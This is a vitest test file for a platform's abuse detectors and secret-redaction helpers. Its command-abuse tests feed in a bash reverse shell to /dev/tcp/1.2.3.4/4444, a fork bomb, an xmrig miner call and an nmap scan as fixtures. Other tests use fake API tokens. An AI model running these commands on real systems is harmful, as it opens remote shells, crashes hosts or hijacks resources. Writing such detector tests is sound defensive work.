import { describe, expect, it } from 'vitest';
import { detectCommandAbuse, detectUsageAbuse, redactSecrets } from '@vibecore/security';
import { redactAuditMetadata } from '@vibecore/audit';
import { redactDeploymentLog, sanitizeDeploymentEnvVars } from '../deployments.js';

const CANARY = 'canary_x9f2zVxKpqL3Mn7QwR8sT4uY';

describe('detectCommandAbuse', () => {
  it('flags crypto-mining binaries', () => {
    const signal = detectCommandAbuse('xmrig', ['--url=pool:3333']);
    expect(signal?.type).toBe('crypto_mining');
    expect(signal?.action).toBe('stop_workspace');
  });

  it('flags reverse shell patterns', () => {
    const signal = detectCommandAbuse('bash', ['-i', '>&', '/dev/tcp/1.2.3.4/4444']);
    expect(signal?.type).toBe('reverse_shell');
  });

  it('flags fork bombs', () => {
    const signal = detectCommandAbuse(':(){ :|:& };:', []);
    expect(signal?.type).toBe('fork_bomb');
  });

  it('flags port scanners', () => {
    const signal = detectCommandAbuse('nmap', ['127.0.0.1']);
    expect(signal?.type).toBe('port_scanning');
  });

  it('returns undefined for benign commands', () => {
    expect(detectCommandAbuse('npm', ['install'])).toBeUndefined();
    expect(detectCommandAbuse('node', ['index.js'])).toBeUndefined();
  });
});

describe('detectUsageAbuse', () => {
  it('returns undefined when all counters are below threshold', () => {
    expect(detectUsageAbuse({})).toBeUndefined();
    expect(
      detectUsageAbuse({
        aiMessages: 100,
        previewRequests: 100,
        workspaceCreations: 5,
        failedAuthAttempts: 5,
      }),
    ).toBeUndefined();
  });

  it('flags failed auth spike at the documented threshold', () => {
    const signal = detectUsageAbuse({ failedAuthAttempts: 20 });
    expect(signal?.type).toBe('failed_auth_spike');
    expect(signal?.severity).toBe('high');
  });

  it('flags workspace creation spike', () => {
    const signal = detectUsageAbuse({ workspaceCreations: 30 });
    expect(signal?.type).toBe('workspace_creation_spike');
  });

  it('flags excessive AI usage', () => {
    const signal = detectUsageAbuse({ aiMessages: 1000 });
    expect(signal?.type).toBe('excessive_ai_usage');
    expect(signal?.action).toBe('throttle');
  });

  it('flags storage abuse at 100 GiB', () => {
    const signal = detectUsageAbuse({ storageBytes: 100 * 1024 * 1024 * 1024 });
    expect(signal?.type).toBe('storage_abuse');
  });

  it('flags CPU abuse at 6 hours', () => {
    const signal = detectUsageAbuse({ cpuSeconds: 6 * 60 * 60 });
    expect(signal?.type).toBe('cpu_abuse');
  });

  it('flags preview spam at 10k requests', () => {
    const signal = detectUsageAbuse({ previewRequests: 10_000 });
    expect(signal?.type).toBe('spam_preview');
  });
});

describe('canary secret redaction', () => {
  it('redactSecrets masks values under common secret keys', () => {
    const out = redactSecrets({
      authorization: `Bearer ${CANARY}`,
      cookie: `session=${CANARY}`,
      password: CANARY,
      api_key: CANARY,
      apiKey: CANARY,
      refresh_token: CANARY,
      nested: { secret: CANARY, harmless: 'ok' },
    }) as Record<string, unknown>;
    expect(JSON.stringify(out)).not.toContain(CANARY);
    expect((out.nested as Record<string, unknown>).harmless).toBe('ok');
  });

  it('redactSecrets masks known secret-shaped string values even under neutral keys', () => {
    const out = redactSecrets({
      logs: [
        `runtime printed ${CANARY}`,
        `provider returned sk_live_${'A'.repeat(20)}`,
        `github token ghp_${'B'.repeat(20)}`,
        `google token ya29.${'C'.repeat(20)}`,
      ],
      message: 'plain runtime output',
    });

    const serialized = JSON.stringify(out);
    expect(serialized).not.toContain(CANARY);
    expect(serialized).not.toContain('sk_live_');
    expect(serialized).not.toContain('ghp_');
    expect(serialized).not.toContain('ya29.');
    expect(serialized).toContain('plain runtime output');
  });

  it('sanitizeDeploymentEnvVars masks secret-shaped env keys at route entry', () => {
    const result = sanitizeDeploymentEnvVars({
      STRIPE_SECRET_KEY: CANARY,
      DATABASE_PASSWORD: CANARY,
      MY_API_KEY: CANARY,
      PUBLIC_LOG_LEVEL: 'info',
      WEBHOOK_URL: 'https://example.com',
    });
    expect(result.STRIPE_SECRET_KEY).toBe('[REDACTED]');
    expect(result.DATABASE_PASSWORD).toBe('[REDACTED]');
    expect(result.MY_API_KEY).toBe('[REDACTED]');
    expect(result.PUBLIC_LOG_LEVEL).toBe('info');
  });

  it('redactDeploymentLog scrubs secret-shaped tokens by pattern', () => {
    const message = `Deploying with token sk_live_${'A'.repeat(20)} and ghp_${'B'.repeat(20)} and ya29.${'C'.repeat(20)}`;
    const out = redactDeploymentLog(message);
    expect(out).not.toMatch(/sk_live_/);
    expect(out).not.toMatch(/ghp_/);
    expect(out).not.toMatch(/ya29\./);
    expect(out).toContain('[REDACTED]');
  });

  it('redactDeploymentLog masks env-var values present in the message', () => {
    const env = { API_TOKEN: CANARY, PUBLIC_LOG_LEVEL: 'info' };
    const out = redactDeploymentLog(`exporting API_TOKEN=${CANARY} and LOG_LEVEL=info`, env);
    expect(out).not.toContain(CANARY);
    expect(out).toContain('LOG_LEVEL=info');
  });

  it('redactAuditMetadata masks secret-shaped keys in audit metadata', () => {
    const out = redactAuditMetadata({
      action: 'deployment.create',
      apiKey: CANARY,
      password: CANARY,
      bearerToken: CANARY,
      provider: 'vercel',
    });
    expect(JSON.stringify(out)).not.toContain(CANARY);
    expect(out.action).toBe('deployment.create');
    expect(out.provider).toBe('vercel');
  });
});
